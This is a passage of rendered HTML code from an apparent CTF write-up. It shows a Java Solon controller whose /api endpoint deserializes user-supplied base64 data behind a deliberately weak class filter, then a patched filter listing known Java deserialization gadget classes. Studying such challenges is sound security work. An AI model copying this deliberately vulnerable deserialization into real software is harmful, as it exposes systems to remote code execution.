    model<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"msg"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span><span class="token string">"/api"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> model<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/*     * WARNING - Removed try catching itself - possible behaviour change.     */</span>    <span class="token annotation punctuation">@Mapping</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"/log"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> filePath <span class="token operator">=</span> <span class="token string">"./logs/solon.log"</span><span class="token punctuation">;</span>        <span class="token class-name">BufferedReader</span> reader <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token class-name">StringBuilder</span> stringBuilder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> line<span class="token punctuation">;</span>            reader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileReader</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>line <span class="token operator">=</span> reader<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                stringBuilder<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">lineSeparator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>reader <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    reader<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> stringBuilder<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Mapping</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"/api"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@Post</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">api</span><span class="token punctuation">(</span><span class="token class-name">Map</span> map<span class="token punctuation">,</span> <span class="token class-name">Context</span> ctx<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">JSONObject</span> jsonObject <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONObject</span><span class="token punctuation">(</span>ctx<span class="token punctuation">.</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> jsonObject<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">User</span> user <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">User</span><span class="token punctuation">)</span><span class="token class-name">DemoController</span><span class="token punctuation">.</span><span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> user<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token string">"success"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token class-name">String</span> data<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> decode <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>decode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">boolean</span> check <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token keyword">private</span> <span class="token class-name">ArrayList</span> <span class="token class-name">Blacklist</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token class-name">InputStream</span> in<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>                <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>Blacklist</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">Hashtable</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>Blacklist</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">HashSet</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>Blacklist</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">TreeMap</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>Blacklist</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">protected</span> <span class="token class-name">Class</span> <span class="token function">resolveClass</span><span class="token punctuation">(</span><span class="token class-name">ObjectStreamClass</span> desc<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> targetc <span class="token operator">=</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">resolveClass</span><span class="token punctuation">(</span>desc<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>check <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token class-name">User</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"HackerClass:"</span> <span class="token operator">+</span> targetc<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"HackerClass:"</span> <span class="token operator">+</span> targetc<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"commons.collections"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">InvalidClassException</span><span class="token punctuation">(</span><span class="token string">"Unauthorized"</span><span class="token punctuation">,</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"com.alibaba.fastjson.JSON"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">InvalidClassException</span><span class="token punctuation">(</span><span class="token string">"Unauthorized"</span><span class="token punctuation">,</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>Blacklist</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">InvalidClassException</span><span class="token punctuation">(</span><span class="token string">"dont do this"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">this</span><span class="token punctuation">.</span>check <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> targetc<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ¥è‡ªå…‰è¾‰å¸ˆå‚…ã®fixï¼Œé€šé˜²ï¼Ÿï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token class-name">Class</span> <span class="token function">resolveClass</span><span class="token punctuation">(</span><span class="token class-name">ObjectStreamClass</span> desc<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"asp"</span><span class="token punctuation">)</span><span class="token operator">||</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"javax.management"</span><span class="token punctuation">)</span><span class="token operator">||</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"AbstractTranslet"</span><span class="token punctuation">)</span><span class="token operator">||</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"Fastjson"</span><span class="token punctuation">)</span><span class="token operator">||</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"jmx"</span><span class="token punctuation">)</span><span class="token operator">||</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"HashMap"</span><span class="token punctuation">)</span><span class="token operator">||</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"java.lang"</span><span class="token punctuation">)</span><span class="token operator">||</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"com.alibaba.fastjson.JSONArray"</span><span class="token punctuation">)</span><span class="token operator">||</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"HashMap"</span><span class="token punctuation">)</span><span class="token operator">||</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"com.alibaba.fastjson"</span><span class="token punctuation">)</span><span class="token operator">||</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"javax.swing"</span><span class="token punctuation">)</span><span class="token operator">||</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"java"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"HackerClass:"</span> <span class="token operator">+</span> desc<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token class-name">Class</span> targetc <span class="token operator">=</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">resolveClass</span><span class="token punctuation">(</span>desc<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>targetc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"asp"</span><span class="token punctuation">)</span><span class="token operator">||</span>targetc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"javax.management"</span><span class="token punctuation">)</span><span class="token operator">||</span>targetc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"AbstractTranslet"</span><span class="token punctuation">)</span><span class="token operator">||</span>targetc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"Fastjson"</span><span class="token punctuation">)</span><span class="token operator">||</span>targetc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"jmx"</span><span class="token punctuation">)</span><span class="token operator">||</span>targetc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"HashMap"</span><span class="token punctuation">)</span><span class="token operator">||</span>targetc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"java.lang"</span><span class="token punctuation">)</span><span class="token operator">||</span>targetc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"com.alibaba.fastjson.JSONArray"</span><span class="token punctuation">)</span><span class="token operator">||</span>targetc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"HashMap"</span><span class="token punctuation">)</span><span class="token operator">||</span>targetc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"com.alibaba.fastjson"</span><span class="token punctuation">)</span><span class="token operator">||</span>targetc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"javax.management"</span><span class="token punctuation">)</span><span class="token operator">||</span>targetc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"javax.swing"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>swing<span class="token punctuation">.</span>event<span class="token punctuation">.</span></span>SwingPropertyChangeSupport</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"java"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"HackerClass:"</span> <span class="token operator">+</span> targetc<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>HashMap</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span> <span class="token class-name">JSONArray</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span> <span class="token class-name">AbstractAction</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span> <span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span> <span class="token class-name">XString</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span> <span class="token class-name">StyledEditorKit<span class="token punctuation">.</span>AlignmentAction</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">AbstractAction</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">StyledEditorKit<span class="token punctuation">.</span>BoldAction</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">StyledEditorKit<span class="token punctuation">.</span>StyledTextAction</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">StyledEditorKit<span class="token punctuation">.</span>UnderlineAction</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"HackerClass:"</span> <span class="token operator">+</span> targetc<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>check <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token class-name">User</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"HackerClass:"</span> <span class="token operator">+</span> targetc<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>HashMap</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span> <span class="token class-name">JSONArray</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span> <span class="token class-name">AbstractAction</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span> <span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span> <span class="token class-name">XString</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span> <span class="token class-name">StyledEditorKit<span class="token punctuation">.</span>AlignmentAction</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">AbstractAction</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">StyledEditorKit<span class="token punctuation">.</span>BoldAction</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">StyledEditorKit<span class="token punctuation">.</span>StyledTextAction</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">StyledEditorKit<span class="token punctuation">.</span>UnderlineAction</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"HackerClass:"</span> <span class="token operator">+</span> targetc<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token 